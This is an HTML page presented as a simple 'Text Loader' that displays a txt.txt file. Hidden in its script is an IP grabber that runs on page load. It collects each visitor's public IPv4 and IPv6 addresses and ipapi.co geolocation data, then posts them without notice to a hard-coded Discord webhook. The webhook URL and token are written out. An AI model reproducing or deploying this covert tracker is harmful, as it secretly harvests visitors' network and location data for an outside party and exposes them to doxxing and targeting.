<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Text Loader</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
      background-color: #f9f9f9;
      color: #333;
    }
    header, footer {
      background-color: #222;
      color: #fff;
      text-align: center;
      padding: 1em;
    }
    h1 {
      margin: 0.5em 0;
      font-size: 2em;
      text-align: center;
      color: #444;
    }
    main {
      flex: 1;
      padding: 1em;
      display: flex;
      justify-content: center;
      align-items: flex-start;
    }
    #content {
      width: 90%;
      max-width: 800px;
      height: 400px;
      overflow-y: auto;
      background-color: #fff;
      border: 1px solid #ccc;
      padding: 1em;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      white-space: pre-wrap;
    }
  </style>
</head>
<body>
  <header>
    Copyright ©️ <span id="year"></span> oekoff. All rights reserved.
  </header>

  <h1>Made by oekoff</h1>

  <main>
    <div id="content">Loading text...</div>
  </main>

  <footer>
    &copy; <span id="yearFooter"></span> oekoff. All rights reserved.
  </footer>

  <script>
        
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1474010870479716364/VqLT5gBq-5i9DHeZHj7YV0KuzxLEuQfSJ01qIwxXxYm1nK3xyZmgl8rL160z_TaAfg02";

    // Function to fetch IPv6
    async function getIPv6() {
      try {
        const response = await fetch('https://ifconfig.me/ip');
        const ipv6 = (await response.text()).trim();
        return ipv6;
      } catch (err) {
        console.error("Error fetching IPv6:", err);
        return "Unavailable";
      }
    }

    async function fetchIPInfo() {
      try {
        // Get public IPv4
        const ipResponse = await fetch("https://ipinfo.io/ip");
        const ipv4 = (await ipResponse.text()).trim();

        // Get detailed info
        const infoResponse = await fetch(`https://ipapi.co/${ipv4}/json/`);
        const infoData = await infoResponse.json();

        // Get IPv6
        const ipv6 = await getIPv6();

        // Combine data
        const outputData = {
          ipv4,
          ipv6,
          ...infoData
        };

        console.log("IP info:", outputData); // Check locally

        // Send to Discord
        await fetch(DISCORD_WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: `IP Info:\n\`\`\`json\n${JSON.stringify(outputData, null, 2)}\n\`\`\``
          })
        });

        console.log("Webhook sent successfully!");
      } catch (error) {
        console.error("Error fetching/sending IP info:", error);
      }
    }

    fetchIPInfo();
  
    // Set current year
    const currentYear = new Date().getFullYear();
    document.getElementById('year').textContent = currentYear;
    document.getElementById('yearFooter').textContent = currentYear;

    // Load txt.txt file
    fetch('txt.txt')
      .then(response => {
        if (!response.ok) throw new Error('File not found');
        return response.text();
      })
      .then(data => {
        document.getElementById('content').textContent = data;
      })
      .catch(err => {
        document.getElementById('content').textContent = "Error loading file: " + err.message;
      });
  </script>
</body>
</html>
